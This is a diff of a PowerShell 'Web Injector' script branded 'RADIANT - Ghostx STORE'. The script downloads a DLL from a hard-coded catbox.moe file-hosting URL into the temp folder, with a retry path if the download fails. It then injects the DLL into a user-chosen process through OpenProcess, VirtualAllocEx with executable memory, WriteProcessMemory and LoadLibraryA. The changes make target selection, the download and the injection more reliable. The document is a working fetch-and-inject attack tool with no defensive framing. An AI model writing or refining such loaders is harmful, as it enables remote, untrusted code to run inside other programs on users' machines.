@@ -30,27 +30,47 @@ if (-not ("Win32" -as [type])) {
 }
 
 # --- CONFIG ---
-$defaultUrl = "https://files.catbox.moe/nb3wab.dll"
-$tempDllPath = "$env:TEMP\radiant_dxgi.dll"
+$defaultUrl = "https://files.catbox.moe/drvmwa.dll"
+$uniqueId = Get-Random -Minimum 1000 -Maximum 9999
+$tempDllPath = Join-Path $env:TEMP "radiant_$uniqueId.dll"
 
 Write-Host "`n    RADIANT - Ghostx STORE | Web Injector" -ForegroundColor Cyan
 Write-Host "    ----------------------------------------"
 
-# --- INPUT PID ---
-$pidInput = Read-Host "`n    [?] Enter Process PID "
-if (-not (Get-Process -Id $pidInput -ErrorAction SilentlyContinue)) {
-    Write-Host "    [!] Invalid PID or Process not found!" -ForegroundColor Red
+# --- TARGET SELECTION ---
+$targetInput = Read-Host "`n    [?] Enter Process Name or PID "
+$targetProc = $null
+
+if ($targetInput -match '^\d+$') {
+    $targetProc = Get-Process -Id $targetInput -ErrorAction SilentlyContinue
+} else {
+    $targetProc = Get-Process -Name $targetInput -ErrorAction SilentlyContinue | Select-Object -First 1
+}
+
+if (-not $targetProc) {
+    Write-Host "    [!] Process not found!" -ForegroundColor Red
     Pause; exit
 }
+$pidInput = $targetProc.Id
 
 # --- DOWNLOAD ---
 Write-Host "    [+] Downloading DLL..." -ForegroundColor Yellow
 try {
-    if (Test-Path $tempDllPath) { Remove-Item $tempDllPath -Force -ErrorAction SilentlyContinue }
-    Invoke-WebRequest -Uri $defaultUrl -OutFile $tempDllPath -TimeoutSec 10
+    # Try to clean up any previous failed downloads or old files if they are not locked
+    Get-ChildItem -Path $env:TEMP -Filter "radiant_*.dll" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    
+    Invoke-WebRequest -Uri $defaultUrl -OutFile $tempDllPath -TimeoutSec 15
+    if (-not (Test-Path $tempDllPath)) { throw "File was not created." }
 } catch {
     Write-Host "    [!] Download Failed: $($_.Exception.Message)" -ForegroundColor Red
-    Pause; exit
+    Write-Host "    [!] Retrying with alternative path..." -ForegroundColor Gray
+    $tempDllPath = Join-Path $env:TEMP "radiant_alt_$([Guid]::NewGuid().ToString().Substring(0,8)).dll"
+    try {
+        Invoke-WebRequest -Uri $defaultUrl -OutFile $tempDllPath -TimeoutSec 15
+    } catch {
+        Write-Host "    [!!] Permanent Download Failure." -ForegroundColor Red
+        Pause; exit
+    }
 }
 
 # --- INJECTION ---
@@ -62,9 +82,10 @@ try {
     if ($hProcess -eq [IntPtr]::Zero) {
         Write-Host "    [!] Failed to open process. Check AV/Admin." -ForegroundColor Red
     } else {
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($fullDllPath + "`0")
+        
         $loadLibAddr = [Win32]::GetProcAddress([Win32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
-        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$fullDllPath.Length, 0x3000, 0x40)
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes($fullDllPath)
+        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$bytes.Length, 0x3000, 0x40)
         $out = [UIntPtr]::Zero
         
         [void][Win32]::WriteProcessMemory($hProcess, $allocMem, $bytes, [uint32]$bytes.Length, [ref]$out)
